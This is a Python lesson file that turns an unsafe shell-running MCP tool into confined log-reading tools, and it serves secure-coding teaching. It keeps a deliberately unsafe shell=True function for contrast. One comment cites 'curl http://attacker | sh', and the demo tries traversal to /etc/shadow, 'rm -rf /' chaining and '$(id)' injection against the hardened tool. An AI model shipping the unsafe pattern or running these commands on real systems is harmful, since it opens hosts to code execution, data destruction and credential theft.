"""Lesson 3.3 (part 1) — refactor a dangerous tool into a bounded one.

The starting point is a tool that runs a shell command. The problem is not the feature; it is
that the feature is unbounded: any command, any path, any time. The refactor keeps the
usefulness (read a log file) and removes the reach (the whole filesystem, the whole shell).

Run:
    uv run python -m M10_security.code.path_validation
"""
from __future__ import annotations

import asyncio
import shlex
import subprocess
from pathlib import Path

from fastmcp import Client, FastMCP

mcp = FastMCP("hardened-tools")

# The allowlist is the security boundary. Everything else in this file exists to make that
# boundary enforceable rather than aspirational.
LOG_ROOT = Path(__file__).with_name("logs").resolve()
LOG_ROOT.mkdir(exist_ok=True)


# --- the ORIGINAL: what a first draft looks like ----------------------------------------
def read_log_UNSAFE(command: str) -> str:
    """Run a shell command and return its output. (For contrast — never ship this.)"""
    # Problems, all of them structural:
    #   1. shell=True means the whole command language is available, not one binary
    #   2. no allowlist: `curl http://attacker | sh` is a valid "log command"
    #   3. no path confinement: /etc/shadow is readable
    #   4. no timeout: a command that blocks holds the whole server
    #   5. the return value is unbounded, so one call can exhaust the context window
    completed = subprocess.run(command, shell=True, capture_output=True, text=True)  # noqa: S602
    return completed.stdout


# --- the REFACTOR: same usefulness, bounded reach --------------------------------------
MAX_BYTES = 64 * 1024


def _resolve_within(path: str) -> Path:
    """Resolve a path and prove it is inside LOG_ROOT.

    `.resolve()` is what makes this work: it collapses `..` and follows symlinks BEFORE the
    check, so `logs/../../etc/shadow` and a symlink pointing outside are both caught. Checking
    the raw string instead is the classic bypass.
    """
    candidate = (LOG_ROOT / path).resolve()
    if candidate != LOG_ROOT and LOG_ROOT not in candidate.parents:
        raise ValueError(f"path escapes the log directory: {path!r}")
    return candidate


@mcp.tool
def read_log(name: str, max_lines: int = 200) -> dict:
    """Read the tail of a log file inside the configured log directory.

    Args:
        name: File name relative to the log directory, e.g. 'postgres.log'.
        max_lines: How many trailing lines to return, 1-1000.
    """
    try:
        target = _resolve_within(name)
    except ValueError as exc:
        return {"ok": False, "error": "path_not_allowed", "hint": str(exc)}
    if not target.is_file():
        return {"ok": False, "error": "not_found",
                "hint": f"{name!r} is not a file in the log directory"}
    max_lines = max(1, min(1000, max_lines))
    text = target.read_text(encoding="utf-8", errors="replace")
    lines = text.splitlines()[-max_lines:]
    body = "\n".join(lines)
    return {"ok": True, "name": name, "lines": len(lines),
            "truncated_bytes": len(body) > MAX_BYTES,
            "content": body[:MAX_BYTES]}


@mcp.tool
def list_logs() -> dict:
    """List the log files that are readable through this server."""
    # Enumerating is a separate tool on purpose: it lets the agent discover what it MAY read
    # without guessing names, which removes the reason to probe for paths at all.
    return {"ok": True,
            "files": sorted(p.name for p in LOG_ROOT.glob("*") if p.is_file())}


@mcp.tool
def grep_log(name: str, pattern: str, max_matches: int = 50) -> dict:
    """Search a log file for a pattern, without invoking a shell.

    Args:
        name: File name relative to the log directory.
        pattern: A plain substring to look for (not a regex — no escaping surprises).
        max_matches: Stop after this many matches, 1-200.
    """
    try:
        target = _resolve_within(name)
    except ValueError as exc:
        return {"ok": False, "error": "path_not_allowed", "hint": str(exc)}
    if not target.is_file():
        return {"ok": False, "error": "not_found", "hint": f"no such log: {name!r}"}
    max_matches = max(1, min(200, max_matches))
    hits = []
    for number, line in enumerate(target.read_text(errors="replace").splitlines(), 1):
        if pattern in line:
            hits.append({"line": number, "text": line[:300]})
            if len(hits) >= max_matches:
                break
    return {"ok": True, "name": name, "matches": len(hits), "results": hits}


def main() -> None:
    log = LOG_ROOT / "postgres.log"
    log.write_text("\n".join([
        "2026-09-19 02:00:01 INFO  checkpoint complete",
        "2026-09-19 02:01:12 WARN  replication lag 4.2s",
        "2026-09-19 02:02:44 ERROR could not connect to host kasm-app",
        "2026-09-19 02:02:45 ERROR retry 1 of 3",
    ]), encoding="utf-8")

    async def run() -> None:
        async with Client(mcp) as client:
            print("=== what the agent can see ===")
            print(" ", (await client.call_tool("list_logs", {})).data)

            print("\n=== a legitimate read ===")
            out = (await client.call_tool("read_log", {"name": "postgres.log", "max_lines": 2})).data
            print(f"  lines={out['lines']} content={out['content']!r}")

            print("\n=== the attacks the boundary now stops ===")
            for attempt in ("../../etc/shadow", "..\\..\\windows\\win.ini", "/etc/passwd",
                            "postgres.log; rm -rf /", "$(id)"):
                result = (await client.call_tool("read_log", {"name": attempt})).data
                print(f"  {attempt:28} -> {result['error']}")

            print("\n=== searching without a shell ===")
            hits = (await client.call_tool("grep_log",
                    {"name": "postgres.log", "pattern": "ERROR"})).data
            print(f"  {hits['matches']} matches; first: {hits['results'][0]['text']!r}")

    asyncio.run(run())

    print("\n=== the five changes, and what each one removes ===")
    for change, removes in [
        ("allowlist of files", "reading anything on the host"),
        ("Path.resolve() confinement", "traversal and symlink escapes"),
        ("no shell anywhere", "command chaining and injection"),
        ("max_lines / MAX_BYTES", "context exhaustion from one call"),
        ("a list_logs tool", "the reason to guess paths at all"),
    ]:
        print(f"  {change:30} removes: {removes}")


if __name__ == "__main__":
    main()
